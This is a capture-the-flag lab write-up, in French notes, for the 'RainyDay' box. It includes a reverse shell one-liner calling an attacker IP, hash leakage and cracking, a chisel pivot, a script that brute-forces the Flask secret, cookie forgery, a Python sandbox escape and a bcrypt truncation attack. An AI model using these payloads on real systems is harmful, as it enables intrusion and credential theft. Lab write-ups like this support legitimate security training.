\chapter{RainyDay}
\begin{itemize}
    \item {\bf technics}: 
    \item {\bf Components}: 
    \item {\bf tools}: 
\end{itemize}


\section{Recon}
\subsection{nmap}
\begin{verbatim}
TARGET_IP=
$ PORTS=$( sudo nmap --min-rate=1000 -T4 -p- $TARGET_IP | grep '^[0-9]' | 
    cut -d'/' -f 1 | tr '\n' ',' | sed s/',$'//)
$ sudo nmap -sVC -p$PORTS $TARGET_IP

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 48dde361dc5d5878f881dd6172fe6581 (ECDSA)
|_  256 adbf0bc8520f49a9a0ac682a2525cd6d (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://rainycloud.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
\end{verbatim}

\subsection{nginx}
\begin{verbatim}
$ ffuf -u http://10.10.11.184 -H 'Host: FUZZ.rainycloud.htb' \
    -w DNS/subdomains-top1million-20000.txt -fs 229

dev                     [Status: 403, Size: 26, Words: 5, Lines: 1, Duration: 76ms]
\end{verbatim}

\section{rainycloud.htb}
registration closed

login form 
\begin{verbatim}
<!-- RainyCloud-4: TODO - Remove debug errors from prod -->
<h4> Error - Login Incorrect! <!-- /var/www/rainycloud/./app.py:288 --></h4>
\end{verbatim}

\begin{verbatim}
$ ffuf -u http://rainycloud.htb/FUZZ \
    -w directory-list-2.3-medium.txt -fc 500,404 -mc all
new                     [Status: 302, Size: 199, Words: 18, Lines: 6, Duration: 308ms]
#                       [Status: 200, Size: 4378, Words: 1045, Lines: 110, Duration: 416ms]
login                   [Status: 200, Size: 3254, Words: 1158, Lines: 63, Duration: 268ms]
register                [Status: 200, Size: 3686, Words: 1324, Lines: 68, Duration: 270ms]
api                     [Status: 308, Size: 239, Words: 18, Lines: 6, Duration: 47ms]
logout                  [Status: 302, Size: 189, Words: 18, Lines: 6, Duration: 53ms]
\end{verbatim}

\subsection{api}
\begin{verbatim}
$ curl -i http://rainycloud.htb/api
HTTP/1.1 308 PERMANENT REDIRECT
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 06 Jan 2023 23:43:35 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 239
Connection: keep-alive
Location: http://rainycloud.htb/api/
\end{verbatim}


\begin{verbatim}
/api/
	This page
/api/list
	Lists containers
/api/healthcheck
	Checks the health of the website (path, type and pattern parameters only available internally)
/api/user/<id>
	Gets information about the given user. Can only view current user information
\end{verbatim}

on va quand même fuzz pour voir si c'est tout

\begin{verbatim}
$ ffuf -u http://rainycloud.htb/api/FUZZ -w api/api-endpoints-res.txt  -mc all -fc 403,404
list                    [Status: 200, Size: 59, Words: 1, Lines: 2, Duration: 111ms]
list                    [Status: 200, Size: 59, Words: 1, Lines: 2, Duration: 143ms]
user/me                 [Status: 200, Size: 3, Words: 1, Lines: 2, Duration: 94ms]
user/current            [Status: 200, Size: 3, Words: 1, Lines: 2, Duration: 117ms]
?:                      [Status: 200, Size: 649, Words: 105, Lines: 24, Duration: 114ms]
\end{verbatim}

\subsubsection{api/user}
visiblement on peut enum les id mais c'est tout 3 users existent
\begin{verbatim}
$ curl  http://rainycloud.htb/api/user/1
{"Error":"Not allowed to view other users info!"}
$ curl  http://rainycloud.htb/api/user/2
{"Error":"Not allowed to view other users info!"}
$ curl  http://rainycloud.htb/api/user/3
{"Error":"Not allowed to view other users info!"}
$ curl  http://rainycloud.htb/api/user/4
{}
\end{verbatim}

par contre 
\begin{verbatim}
$ curl  http://rainycloud.htb/api/user/1.0
{"id":1,"password":"$2a$10$bit.DrTClexd4.wVpTQYb.FpxdGFNPdsVX8fjFYknhDwSxNJh.O.O","username":"jack"}
$ curl  http://rainycloud.htb/api/user/2.0
{"id":2,"password":"$2a$05$FESATmlY4G7zlxoXBKLxA.kYpZx8rLXb2lMjz3SInN4vbkK82na5W","username":"root"}
$ curl  http://rainycloud.htb/api/user/3.0
{"id":3,"password":"$2b$12$WTik5.ucdomZhgsX6U/.meSgr14LcpWXsCA0KxldEw8kksUtDuAuG","username":"gary"}
\end{verbatim}

\begin{verbatim}
$ john --wordlist=/usr/share/wordlists/passwords/rockyou.txt hashes
Warning: detected hash type "bcrypt", but the string is also recognized as "bcrypt-opencl"
Use the "--format=bcrypt-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (bcrypt [Blowfish 32/64 X3])
Loaded hashes with cost 1 (iteration count) varying from 32 to 4096
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
$ cat ~/.john/john.port
$2b$12$WTik5.ucdomZhgsX6U/.meSgr14LcpWXsCA0KxldEw8kksUtDuAuG:rubberducky
\end{verbatim}

\subsection{connected}

on peut creer des containers avec python

on y lance un coup de revershell sur command en background
\begin{verbatim}
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.6",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
\end{verbatim}

donc le reseau des containers c'est \verb+172.18.0.3/16+ donc en toute logique
le host est en \verb+172.18.0.1+ donc on va voir si on peut acceder au port 80
pour pouvoir attacker \verb+dev.rainycloud.htb+
\begin{verbatim}
$ /usr/bin/nc -lnvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.11.184 46554
/ $ ^[[54;5Rnc -nv 172.18.0.1 80
nc -nv 172.18.0.1 80
172.18.0.1 (172.18.0.1:80) open
get
get
HTTP/1.1 400 Bad Request
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 07 Jan 2023 00:48:21 GMT
Content-Type: text/html
Content-Length: 166
Connection: close

<html>
<head><title>400 Bad Request</title></head>
<body>
<center><h1>400 Bad Request</h1></center>
<hr><center>nginx/1.18.0 (Ubuntu)</center>
</body>
</html>
\end{verbatim}

donc il va falloir pivoter après un wget chisel

\begin{verbatim}
$ ./chisel server -p 9999 --reverse
2023/01/07 01:55:07 server: Reverse tunnelling enabled
2023/01/07 01:55:07 server: Fingerprint +3QYzg5d0lyrv4XqIDW8P4bWTWf/t7svkYYA3IQrOvE=
2023/01/07 01:55:07 server: Listening on http://0.0.0.0:9999
2023/01/07 01:56:00 server: session#1: tun: proxy#R:8888=>172.18.0.1:80: Listening

/tmp $ ^[[54;8R./chisel client --max-retry-count=1 10.10.16.6:9999 R:8888:172.18.0.1:80
./chisel client --max-retry-count=1 10.10.16.6:9999 R:8888:172.18.0.1:80
2023/01/07 00:56:00 client: Connecting to ws://10.10.16.6:9999
2023/01/07 00:56:00 client: Connected (Latency 26.970962ms)

$ curl -I http://localhost:8888 -H 'Host: dev.rainycloud.htb'
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 07 Jan 2023 00:58:03 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 4581
Connection: keep-alive
\end{verbatim}


\section{dev.rainycloud.htb}
\begin{verbatim}
$ curl -i http://dev.rainycloud.htb/
HTTP/1.1 403 FORBIDDEN
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 06 Jan 2023 23:52:49 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 26
Connection: keep-alive

Access Denied - Invalid IP
\end{verbatim}


on ne semble pas avoir plus que ca sur l'interface donc on va check API
\begin{verbatim}
$ curl -s  http://localhost:8888/api/healthcheck -H 'Host: dev.rainycloud.htb' |jq
{
  "result": true,
  "results": [
    {
      "file": "/bin/bash",
      "pattern": {
        "type": "ELF"
      }
    },
    {
      "file": "/var/www/rainycloud/app.py",
      "pattern": {
        "type": "PYTHON"
      }
    },
    {
      "file": "/var/www/rainycloud/sessions/db.sqlite",
      "pattern": {
        "type": "SQLITE"
      }
    },
    {
      "file": "/etc/passwd",
      "pattern": {
        "pattern": "^root.*",
        "type": "CUSTOM"
      }
    }
  ]
}
\end{verbatim}

\begin{verbatim}
$ curl -s -XPOST  http://localhost:8888/api/healthcheck -H 'Host: dev.rainycloud.htb'
Unauthenticated

$ curl -XPOST  http://localhost:8888/api/healthcheck \
    -H 'Host: dev.rainycloud.htb' --cookie "session=$TOKEN" -d ''
ERROR - missing parameter
\end{verbatim}

donc si on reprend ce qui est le retour du get
\begin{verbatim}
$ curl -XPOST  http://localhost:8888/api/healthcheck \
    -H 'Host: dev.rainycloud.htb' --cookie "session=$TOKEN" \
    -d 'file=/etc/passwd&type=CUSTOM&pattern=^root.*' |jq
{
  "result": true,
  "results": [
    {
      "file": "/etc/passwd",
      "pattern": {
        "pattern": "^root.*",
        "type": "CUSTOM"
      }
    }
  ]
}
\end{verbatim}

bon comme on est sur du python il faudrait voir si l'on peut crafter un cookie
pour jack

il faut enumérer pour trouver la clé

donc on commence par enumerer les fichier \verb+.py+
\begin{verbatim}
$ curl -XPOST  http://localhost:8888/api/healthcheck \
    -H 'Host: dev.rainycloud.htb' \
    --cookie "session=$TOKEN" \
    -d 'file=/var/www/rainycloud/app.py&type=CUSTOM&pattern=.*' |jq
{
  "result": true,
  "results": [
    {
      "file": "/var/www/rainycloud/app.py",
      "pattern": {
        "pattern": ".*",
        "type": "CUSTOM"
      }
    }
  ]
}
$ ffuf -X POST \
    -u http://dev.rainycloud.htb:8888/api/healthcheck \
    -H "Cookie: session=$TOKEN" \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    -d 'file=/var/www/rainycloud/FUZZ.py&type=custom&pattern=.*' \
    -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt \
    -mr 'true'

app                     [Status: 200, Size: 109, Words: 1, Lines: 2, Duration: 88ms]
secrets                 [Status: 200, Size: 113, Words: 1, Lines: 2, Duration: 173ms]
\end{verbatim}

il va falloir brute force le nom de la variable:

\begin{verbatim}
$ curl -s -XPOST  http://dev.rainycloud.htb:8888/api/healthcheck \
    --cookie "session=$TOKEN" \
    -d 'file=/var/www/rainycloud/secrets.py&type=CUSTOM&pattern=^SECRET.*'
{"result":true,"results":[{"file":"/var/www/rainycloud/secrets.py","pattern":{"pattern":"^SECRET.*","type":"CUSTOM"}}]}
\end{verbatim}

donc on part de la

en en commencant comme cela on trouve la var
\begin{verbatim}
import string
import requests
import json

allchars = string.printable
cookies = {'session': 'eyJ1c2VybmFtZSI6ImdhcnkifQ.Y7jErw.6vi59Dntw_XFNvj7GJauY7imMW8'}

s = requests.Session()
pattern = ""
forbiden = ('*', '?', '.', '(', ')', '[', ']' )

varchars = string.digits + string.ascii_letters + '_' + ' ' + '='

while True:
    for c in varchars:
        if c in forbiden:
            continue

        #print(c)
        try:
            rsp = s.post('http://dev.rainycloud.htb:8888/api/healthcheck', {
                'file': '/var/www/rainycloud/secrets.py',
                'type': 'custom',
                'pattern': "^SECRET" + pattern + c + ".*"
            }, cookies=cookies)
            if json.loads(rsp.content)['result']:
                pattern += c
                print(pattern)
                break
        except Exception:
            print(rsp.content)

\end{verbatim}
puis on adabpe et on trouve:
\begin{verbatim}
f77dd59f50ba412fcfbd3e653f8f3f2ca97224dd53cf6304b4c86658a75d8f67
\end{verbatim}

on peut donc decoder notre propre cookie
\begin{verbatim}
 $ flask-session-cookie-manager3 decode \
    -s f77dd59f50ba412fcfbd3e653f8f3f2ca97224dd53cf6304b4c86658a75d8f67 \
    -c eyJ1c2VybmFtZSI6ImdhcnkifQ.Y7jErw.6vi59Dntw_XFNvj7GJauY7imMW8
{'username': 'gary'}
\end{verbatim}

et regarder la structure d'un cookie

\begin{verbatim}
> flask_session_cookie_manager3.py encode \
    -s f77dd59f50ba412fcfbd3e653f8f3f2ca97224dd53cf6304b4c86658a75d8f67 \
    -t "{'username': 'jack'}"
eyJ1c2VybmFtZSI6ImphY2sifQ.Y7jOkg.dAhrNj-i7G0VpeVtND-4c_0ndoI
\end{verbatim}

\section{rainycloud.htb as jack}

donc on se connect bien avec jack
et on va pouvoir rentrer dans son container avec un reverse shell


\begin{verbatim}
2023/01/07 07:26:43 CMD: UID=1000 PID=1194   | sleep 100000000
ls -a /proc/1194/root/home/jack/.ssh
.                authorized_keys  known_hosts
..               id_rsa

\end{verbatim}

on va pouvoir sortir de cet enfer


\section{jack}
\subsubsection{x}
\begin{verbatim}
jack@rainyday:~$ ls
user.txt
jack@rainyday:~$ curl -O http://10.10.16.6:4445/linpeas.sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  806k  100  806k    0     0  1683k      0 --:--:-- --:--:-- --:--:-- 1683k
jack@rainyday:~$ curl -O http://10.10.16.6:4445/pspy64
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 3006k  100 3006k    0     0  1746k      0  0:00:01  0:00:01 --:--:-- 1745k
jack@rainyday:~$ sudo -l
Matching Defaults entries for jack on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jack may run the following commands on localhost:
    (jack_adm) NOPASSWD: /usr/bin/safe_python *
\end{verbatim}

\href{https://www.reelix.za.net/2021/04/the-craziest-python-sandbox-escape.html}{Python
Sandbox Escape}

\begin{verbatim}
$ cat /tmp/test.py
import os
os.system('whoami')
jack@rainyday:~$ sudo -u jack_adm /usr/bin/safe_python /tmp/test.py
Traceback (most recent call last):
  File "/usr/bin/safe_python", line 29, in <module>
    exec(f.read(), env)
  File "<string>", line 1, in <module>
ImportError: __import__ not found

$ cat /tmp/test.py
print(().__class__.__mro__[1].__subclasses__()[144].__init__.__globals__["__builtins__"]["__loader__"]().load_module("builtins").__import__("os").system("bash -i"))
\end{verbatim}

\subsection{jack adm}


\begin{verbatim}
$ sudo -u jack_adm /usr/bin/safe_python /tmp/test.py
jack_adm@rainyday:/home/jack$ id
uid=1002(jack_adm) gid=1002(jack_adm) groups=1002(jack_adm)
jack_adm@rainyday:/home/jack$ sudo -l
Matching Defaults entries for jack_adm on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jack_adm may run the following commands on localhost:
    (root) NOPASSWD: /opt/hash_system/hash_password.py
$ sudo /opt/hash_system/hash_password.py
Enter Password> jcdsq
[+] Hash: $2b$05$CoJJS3FbiWoTO3.HYMr13umGzZunRxnz4d5wxKepaEWLIbsvVh2aK
\end{verbatim}
\begin{verbatim}


# SecLists/Passwords/Leaked-Databases/md5decryptor-uk.txt
> hashcat -m 3200 hash.txt md5decryptor-uk.txt

> sed 's/$/Sup3rDup3r/' /usr/share/wordlists/rockyou.txt > newrockyou.txt
> hashcat -m 3200 hash.txt newrockyou.txt

\end{verbatim}


\begin{verbatim}
import bcrypt
from config import SECRET

while True:
user_input = input("Enter Password> ")
if len(user_input) > 30 or len(user_input)==0:
print("[+] Invalid Input Length! Must be <= 30 and >0")
else:
data = (user_input + SECRET).encode()
hashed = bcrypt.hashpw(data, bcrypt.gensalt(rounds=5))
print(f"[+] Hash: {hashed.decode()}")
break
\end{verbatim}

\href{https://security.stackexchange.com/questions/39849/does-bcrypt-have-a-maximum-password-length}{max
pass len bcrypt}

\begin{verbatim}
the script ask for minimum of 1 char, and max 30 char, normally each char use 1
byte, but not all chars, for example á, you can search for them in UTF-8

so if you bcrypt() let say 4 "á" (that weights 4bytes each), you will be using 16bytes

so the salt will be attaching to you string, so in the reality the system will be doing this:
bcrypt( ááááSECRET_SALT)

this "payload" weights 27bytes, no problem for bcrypt, if you put let say 15xá + 11xo
áááááááááááááááooooooooooo this weights 71bytes

so the script will be doing this
bcrypt(áááááááááááááááoooooooooooS)   <--- only one space left for the SECRET_SALT on position 72


so you have to brute force your already know payload
(áááááááááááááááooooooooooo+$)   where $ is a loop of every know character, and
each hash created, you need to compare it with the one created with the server
script (with the server script you need to use exactly the same payload as your
script (áááááááááááááááooooooooooo+$)), if they match, you have found the first
letter, of the SECRET_SALT

then you have to delete one "o" from the original 11 and you will attach the
letter found on the bruteforce (S), then again, brute force every letter on the
position 72, loop this, until you get your SECRET_SALT

I hope I made myself clear, stoned as fuck, and not my native language.
\end{verbatim}


\section{Theorie}


